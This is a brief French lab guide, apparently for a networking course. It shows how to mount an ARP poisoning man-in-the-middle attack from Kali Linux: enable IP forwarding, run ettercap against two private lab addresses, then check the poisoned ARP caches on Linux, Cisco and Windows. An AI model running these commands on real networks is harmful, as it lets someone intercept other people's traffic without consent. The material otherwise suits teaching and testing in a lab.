# Attaque ARP Poisoning avec Kali Linux

##  1. Activation du routage sur Kali

```
sudo sysctl -w net.ipv4.ip_forward=1
```

## 2. Lancement de l'ARP Poisoning

```
etusio@kali:~$ sudo ettercap -i eth0 -T -M arp /192.168.56.10/ //192.168.56.11// 
```

## 3. Analyse des caches ARP empoisonnés

Sous Linux

```
etusio@clissh:~$ ip neigh show

```

Sous Cisco

```
Routeur # show ip arp
```

Sous Windows

```
C:\> arp -a 
```


